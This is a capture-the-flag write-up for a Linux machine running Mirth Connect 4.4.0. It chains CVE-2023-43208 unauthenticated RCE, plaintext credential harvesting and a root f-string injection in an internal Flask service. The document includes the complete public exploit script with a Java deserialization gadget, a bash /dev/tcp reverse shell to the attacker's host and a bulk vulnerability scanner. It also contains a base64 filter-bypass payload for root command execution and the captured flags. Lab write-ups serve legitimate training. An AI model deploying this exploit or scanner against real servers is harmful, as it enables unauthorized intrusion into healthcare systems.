**Difficulty:** Medium  
**OS:** Linux (Debian 12)  
**IP:** 10.129.1.190  

---
## Reconnaissance

Standard port scan reveals HTTP/HTTPS on 80/443 and SSH on 22, all served by a Java process (Mirth Connect). The service identifies itself as Mirth Connect 4.4.0.

``` 
Open 10.129.1.190:22
Open 10.129.1.190:80
Open 10.129.1.190:443
Open 10.129.1.190:6661
```

`echo "10.129.1.190" | sudo tee -a /etc/hosts`


---
## Initial Access — CVE-2023-43208 (Mirth Connect RCE)

Mirth Connect 4.4.0 is vulnerable to **CVE-2023-43208**, an unauthenticated remote code execution vulnerability fixed in version 4.4.1. The exploit chains two issues: an authentication bypass and a Java deserialization gadget.

The public PoC required `pwncat-cs`, which had dependency conflicts. The exploit was modified to use a native Python socket-based shell handler instead:

```python
# Replace pwncat listener with raw socket
import socket, select, sys

def start_listener(host, port):
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((host, port))
    s.listen(1)
    conn, addr = s.accept()
    while True:
        r, _, _ = select.select([conn, sys.stdin], [], [])
        if conn in r:
            data = conn.recv(4096)
            if not data: break
            sys.stdout.write(data.decode(errors='replace'))
            sys.stdout.flush()
        if sys.stdin in r:
            cmd = sys.stdin.readline()
            conn.send(cmd.encode())
```

Running the exploit against `https://10.129.1.190` yields a shell as the `mirth` user.
```
python3 CVE-2023-43208.py -u https://10.129.1.190 -lh 10.10.14.161 -lp 9001
```

```
uid=103(mirth) gid=111(mirth) groups=111(mirth)
```

---
## Credential Harvesting

Mirth Connect stores its database credentials in plaintext in its configuration file:

```bash
cat /usr/local/mirthconnect/conf/mirth.properties
```

Key findings:
- **Database:** `mirthdb` / `MirthPass123!` → MariaDB on `localhost:3306/mc_bdd_prod`
- **Keystore passwords:** `5GbU5HGTOOgE` / `tAuJfQeXdnPw`

Connecting to the database and enumerating the `PERSON` table reveals a user named **sedric** (user ID 2). The password hash is stored in Mirth Connect's proprietary bcrypt-based format and is not easily crackable. Password reuse attempts with all discovered credentials fail.

---
## Internal Service Discovery

Enumerating listening ports reveals a service not exposed externally:

```bash
ss -tlnp
# LISTEN 0  128  127.0.0.1:54321  0.0.0.0:*
```

Examining the Mirth Connect channel in the database reveals its purpose:

```sql
SELECT NAME, SUBSTRING(CHANNEL, 1, 500) FROM CHANNEL;
-- Channel: "INTERPRETER - HL7 TO XML TO NOTIFY"
-- Destination: HTTP POST to http://127.0.0.1:54321/addPatient
```

The channel receives HL7 v2 messages over MLLP on port 6661, transforms them to XML, and forwards patient data to the internal service.

---
## Foothold Enumeration — Internal Flask App

Probing the service with `wget` and Python's `urllib`:

- `GET /addPatient` → `405 Method Not Allowed` (endpoint exists)
- `POST /addPatient` with arbitrary data → `200 [INVALID_INPUT]`

The Flask app source (`/usr/local/bin/notif.py`) is owned by `root:sedric` with mode `750` — not readable by `mirth`. The process (PID 3560) runs as **root**.

By sending valid XML matching the channel's output format, the app responds with formatted patient data:

```python
data = b'<patient><timestamp>20240101120000</timestamp><sender_app>WEBAPP</sender_app>' \
       b'<id>1</id><firstname>John</firstname><lastname>Doe</lastname>' \
       b'<birth_date>01/01/1990</birth_date><gender>M</gender></patient>'
# Response: b'Patient John Doe (M), 36 years old, received from WEBAPP at 20240101120000'
```

The `birth_date` field must use `MM/DD/YYYY` format (other formats return `[INVALID_DOB]`).

---
## Exploitation — Python f-string Injection (RCE as root)

Testing format string payloads in the `firstname` field:

```
{0}       → reflected as literal "0"   (format string evaluation confirmed)
{}        → [EVAL_ERROR] f-string: empty expression not allowed
{__import__('os').popen('id').read()}  → uid=0(root) gid=0(root) groups=0(root)
```

The app is using Python's `f-string` (or `eval`-based) string interpolation to build the response string, and user-controlled XML field values are inserted directly into the expression — **classic f-string injection**.

The `/` character in file paths is blocked by input validation. This is bypassed by base64-encoding the command:

```python
import urllib.request, base64

def run_cmd(cmd):
    b64 = base64.b64encode(cmd.encode()).decode()
    expr = f"__import__('os').popen(__import__('base64').b64decode('{b64}').decode()).read()"
    payload = (
        f"<patient><timestamp>20240101120000</timestamp>"
        f"<sender_app>WEBAPP</sender_app><id>1</id>"
        f"<firstname>{{{expr}}}</firstname>"
        f"<lastname>Doe</lastname><birth_date>01/01/1990</birth_date>"
        f"<gender>M</gender></patient>"
    ).encode()
    req = urllib.request.Request('http://127.0.0.1:54321/addPatient', data=payload, method='POST')
    req.add_header('Content-Type', 'text/plain')
    return urllib.request.urlopen(req).read()

print(run_cmd('cat /home/sedric/user.txt'))
print(run_cmd('cat /root/root.txt'))
```

---

## Flags

```
user.txt:  24c191be2c979ab27b61c726936305a3
root.txt:  a70379a1cf3627f0671a8ac3498d6cdb
```

---

## Attack Chain Summary

```
CVE-2023-43208 (Mirth Connect 4.4.0 RCE)
        │
        ▼
Shell as mirth
        │
        ├─ /usr/local/mirthconnect/conf/mirth.properties
        │   └─ DB creds: mirthdb / MirthPass123!
        │
        ├─ MariaDB → mc_bdd_prod → CHANNEL table
        │   └─ Internal service: http://127.0.0.1:54321/addPatient
        │
        └─ Python f-string injection in notif.py (running as root)
                │
                ├─ user.txt (via /home/sedric/user.txt)
                └─ root.txt (via /root/root.txt)
```

---

## Key Vulnerabilities

| Vulnerability | Location | Impact |
|---|---|---|
| CVE-2023-43208 | Mirth Connect 4.4.0 | Unauthenticated RCE |
| Plaintext credentials | `mirth.properties` | DB access |
| Python f-string injection | `notif.py` port 54321 | RCE as root |
| Input filter bypass | Base64 encoding | Path traversal in commands |

---

## Lessons Learned

- Always check internal listening ports after initial access — services bound to `127.0.0.1` are a common pivot point.
- Mirth Connect channels in the database reveal the full integration topology including internal endpoints.
- Python f-string injection is a severe vulnerability when user input is embedded in format strings without sanitization. Blacklist filters (blocking `{`, `%`, backticks, etc.) can often be bypassed by encoding payloads.
- When a filter blocks `/` in commands, base64-encoding the entire command string is an effective bypass.


## CVE-2023-43208-EXPLOIT
 
``` python
import os
import time
import socket
import argparse
import requests
import threading

from packaging import version
from rich.console import Console
from alive_progress import alive_bar
from concurrent.futures import ThreadPoolExecutor, as_completed

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)


class MirthConnectExploit:
    def __init__(self):
        self.console = Console()
        self.execution_process = "/api/users"
        self.grab_version = "/api/server/version"
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.0; rv:109.0) Gecko/20100101 Firefox/118.0",
            "X-Requested-With": "OpenAPI",
            "Content-Type": "application/xml",
        }
        self.output_file = None
        self.revshell_connected = False

    def custom_print(self, message: str, header: str) -> None:
        header_colors = {"+": "green", "-": "red", "!": "yellow", "*": "blue"}
        self.console.print(
            f"[bold {header_colors.get(header, 'white')}][{header}][/bold {header_colors.get(header, 'white')}] {message}"
        )

    def ascii_art(self):
        art_texts = [
            " ██████ ██    ██ ███████       ██████   ██████  ██████  ██████        ██   ██ ██████  ██████   ██████   █████",
            "██      ██    ██ ██                 ██ ██  ████      ██      ██       ██   ██      ██      ██ ██  ████ ██   ██",
            "██      ██    ██ █████   █████  █████  ██ ██ ██  █████   █████  █████ ███████  █████   █████  ██ ██ ██  █████",
            "██       ██  ██  ██            ██      ████  ██ ██           ██            ██      ██ ██      ████  ██ ██   ██",
            " ██████   ████   ███████       ███████  ██████  ███████ ██████             ██ ██████  ███████  ██████   █████",
        ]
        print()
        for text in art_texts:
            self.custom_print(f"[bold bright_green]{text}[/bold bright_green]", "*")
        print()
        self.custom_print(
            "Coded By: K3ysTr0K3R and Chocapikk ( NSA, we're still waiting :D )", "+"
        )
        print()

    def start_listener(self, timeout=10) -> None:
        import sys
        import select

        with socket.create_server(("0.0.0.0", int(self.rshell_port))) as listener:
            listener.settimeout(timeout)
            self.custom_print(
                f"Waiting for incoming connection on port {self.rshell_port}...", "*"
            )

            try:
                victim, victim_addr = listener.accept()
                self.revshell_connected = True
                self.custom_print(
                    f"Received connection from {victim_addr[0]}:{victim_addr[1]}", "+"
                )
                self.custom_print("Interactive shell opened. Type 'exit' to quit.\n", "+")

                victim.setblocking(False)

                while True:
                    try:
                        ready = select.select([victim, sys.stdin], [], [], 1.0)
                    except KeyboardInterrupt:
                        break

                    if victim in ready[0]:
                        try:
                            data = victim.recv(4096)
                            if not data:
                                self.custom_print("Connection closed by remote host.", "-")
                                break
                            sys.stdout.write(data.decode(errors="replace"))
                            sys.stdout.flush()
                        except Exception:
                            break

                    if sys.stdin in ready[0]:
                        cmd = sys.stdin.readline()
                        if not cmd or cmd.strip() == "exit":
                            break
                        try:
                            victim.sendall(cmd.encode())
                        except Exception:
                            break

                victim.close()

            except socket.timeout:
                self.custom_print(
                    f"No reverse shell connection received within {timeout} seconds.",
                    "-",
                )

    def detect_mirth_connect(self, target):
        self.custom_print("Looking for Mirth Connect instance...", "*")
        try:
            response = requests.get(target, timeout=10, verify=False)
            if "Mirth Connect Administrator" in response.text:
                self.custom_print("Found Mirth Connect instance", "+")
                return True
            else:
                self.custom_print("Mirth Connect not found", "-")
        except requests.exceptions.RequestException as e:
            self.custom_print(f"Error while trying to connect to {target}: {e}", "-")
        return False

    def is_vulnerable_version(self, version_str):
        parsed_version = version.parse(version_str)
        if isinstance(parsed_version, version.Version):
            fixed_version = version.parse("4.4.1")
            if parsed_version < fixed_version:
                return version_str

    def detect_vuln(self, target):
        if self.detect_mirth_connect(target):
            try:
                response = requests.get(
                    target + self.grab_version,
                    headers=self.headers,
                    timeout=10,
                    verify=False,
                )
                if response and self.is_vulnerable_version(response.text):
                    self.custom_print(
                        f"Vulnerable Mirth Connect version {response.text} instance found at {target}",
                        "+",
                    )
                    return True
            except requests.exceptions.RequestException as e:
                self.custom_print(
                    f"Error fetching version information from {target}: {e}", "-"
                )
        return False

    @staticmethod
    def build_xml_payload(command):
        command = command.replace("&", "&amp;")
        command = command.replace("<", "&lt;")
        command = command.replace(">", "&gt;")
        command = command.replace('"', "&quot;")
        command = command.replace("'", "&apos;")

        xml_data = f"""
        <sorted-set>
            <string>abcd</string>
            <dynamic-proxy>
                <interface>java.lang.Comparable</interface>
                <handler class="org.apache.commons.lang3.event.EventUtils$EventBindingInvocationHandler">
                    <target class="org.apache.commons.collections4.functors.ChainedTransformer">
                        <iTransformers>
                            <org.apache.commons.collections4.functors.ConstantTransformer>
                                <iConstant class="java-class">java.lang.Runtime</iConstant>
                            </org.apache.commons.collections4.functors.ConstantTransformer>
                            <org.apache.commons.collections4.functors.InvokerTransformer>
                                <iMethodName>getMethod</iMethodName>
                                <iParamTypes>
                                    <java-class>java.lang.String</java-class>
                                    <java-class>[Ljava.lang.Class;</java-class>
                                </iParamTypes>
                                <iArgs>
                                    <string>getRuntime</string>
                                    <java-class-array/>
                                </iArgs>
                            </org.apache.commons.collections4.functors.InvokerTransformer>
                            <org.apache.commons.collections4.functors.InvokerTransformer>
                                <iMethodName>invoke</iMethodName>
                                <iParamTypes>
                                    <java-class>java.lang.Object</java-class>
                                    <java-class>[Ljava.lang.Object;</java-class>
                                </iParamTypes>
                                <iArgs>
                                    <null/>
                                    <object-array/>
                                </iArgs>
                            </org.apache.commons.collections4.functors.InvokerTransformer>
                            <org.apache.commons.collections4.functors.InvokerTransformer>
                                <iMethodName>exec</iMethodName>
                                <iParamTypes>
                                    <java-class>java.lang.String</java-class>
                                </iParamTypes>
                                <iArgs>
                                    <string>{command}</string>
                                </iArgs>
                            </org.apache.commons.collections4.functors.InvokerTransformer>
                        </iTransformers>
                    </target>
                    <methodName>transform</methodName>
                    <eventTypes>
                        <string>compareTo</string>
                    </eventTypes>
                </handler>
            </dynamic-proxy>
        </sorted-set>
        """
        return xml_data

    def exploit(self, target, lhost, lport):
        if self.detect_vuln(target):
            command = f"sh -c $@|sh . echo bash -c '0<&53-;exec 53<>/dev/tcp/{lhost}/{lport};sh <&53 >&53 2>&53'"
            self.custom_print(command, "!")
            xml_data = self.build_xml_payload(command)
            try:
                self.custom_print(f"Launching exploit against {target}...", "*")
                try:
                    response = requests.post(
                        target + self.execution_process,
                        headers=self.headers,
                        data=xml_data,
                        timeout=20,
                        verify=False,
                    )
                except requests.exceptions.RequestException as e:
                    self.custom_print(f"Exploit failed for {target}: {e}", "-")

            except requests.exceptions.RequestException:
                self.custom_print(f"Exploit failed for {target}", "-")

    def shell_opened(self, target, lhost, lport, bindport=None, timeout=10):
        self.rshell_port = bindport if bindport is not None else lport

        self.custom_print(
            f"Setting up listener on {lhost}:{self.rshell_port} and launching exploit...",
            "*",
        )

        listener_thread = threading.Thread(target=self.start_listener, args=(timeout,))
        listener_thread.start()
        time.sleep(1)

        self.exploit(target, lhost, lport)

        listener_thread.join()

    def scanner(self, target):
        try:
            response = requests.get(
                target + self.grab_version,
                headers=self.headers,
                timeout=10,
                verify=False,
            )
            vuln_version = self.is_vulnerable_version(response.text)
            if vuln_version:
                self.custom_print(
                    f"Vulnerability Detected | [bold bright_yellow]{target:<60}[/bold bright_yellow] | Server Version: [bold cyan]{vuln_version:<15}[/bold cyan]",
                    "+",
                )
                if self.output_file:
                    with open(self.output_file, "a") as file:
                        file.write(target + "\n")
        except requests.exceptions.RequestException:
            pass

    def scan_from_file(self, target_file, threads):
        if not os.path.exists(target_file):
            self.custom_print(f"File not found: {target_file}", "-")
            return

        with open(target_file, "r") as url_file:
            urls = [url.strip() for url in url_file.readlines()]
            if not urls:
                return

            with alive_bar(
                len(urls), title="Scanning Targets", bar="smooth", enrich_print=False
            ) as bar:
                with ThreadPoolExecutor(max_workers=threads) as executor:
                    futures = [executor.submit(self.scanner, url) for url in urls]
                    for future in as_completed(futures):
                        bar()

    def run(self):
        parser = argparse.ArgumentParser(
            description="A PoC exploit for CVE-2023-43208 - Mirth Connect Remote Code Execution (RCE)"
        )
        parser.add_argument("-u", "--url", help="Target URL to exploit")
        parser.add_argument("-lh", "--lhost", help="Listening host")
        parser.add_argument("-lp", "--lport", help="Listening port")
        parser.add_argument(
            "-bp",
            "--bindport",
            type=int,
            help="Port for the bind listener (useful with ngrok)",
        )
        parser.add_argument("-f", "--file", help="File containing target URLs to scan")
        parser.add_argument(
            "-o", "--output", help="Output file for saving scan results"
        )
        parser.add_argument(
            "-t",
            "--threads",
            default=50,
            type=int,
            help="Number of threads to use for scanning",
        )
        args = parser.parse_args()

        self.output_file = args.output

        match (args.url, args.lhost, args.lport, args.file):
            case (url, lhost, lport, None) if url and lhost and lport:
                self.shell_opened(url, lhost, lport, args.bindport)
            case (None, None, None, file) if file:
                self.scan_from_file(file, args.threads)
            case _:
                parser.print_help()


if __name__ == "__main__":
    exploit_tool = MirthConnectExploit()
    exploit_tool.ascii_art()
    exploit_tool.run()

```



```
mirth@interpreter: cat > /tmp/pwn3.py << 'EOF'
> import urllib.request
> 
> def run_cmd(cmd):
>     # Use base64 to avoid slash filtering
>     import base64
>     b64 = base64.b64encode(cmd.encode()).decode()
>     wrapped = f"__import__('os').popen(__import__('base64').b64decode('{b64}').decode()).read()"
>     payload = f"<patient><timestamp>20240101120000</timestamp><sender_app>WEBAPP</sender_app><id>1</id><firstname>{{{wrapped}}}</firstname><lastname>Doe</lastname><birth_date>01/01/1990</birth_date><gender>M</gender></patient>"
>     data = payload.encode()
>     req = urllib.request.Request('http://127.0.0.1:54321/addPatient', data=data, method='POST')
>     req.add_header('Content-Type', 'text/plain')
>     r = urllib.request.urlopen(req)
>     return r.read()
> 
> print(run_cmd('cat /home/sedric/user.txt'))
> print(run_cmd('cat /root/root.txt'))
> 
EOF
mirth@interpreter:/usr/local/mirthconnect$ python3 /tmp/pwn3.py
python3 /tmp/pwn3.py
b'Patient 24c191be2c979ab27b61c726936305a3\n Doe (M), 36 years old, received from WEBAPP at 20240101120000'
b'Patient a70379a1cf3627f0671a8ac3498d6cdb\n Doe (M), 36 years old, received from WEBAPP at 20240101120000'

```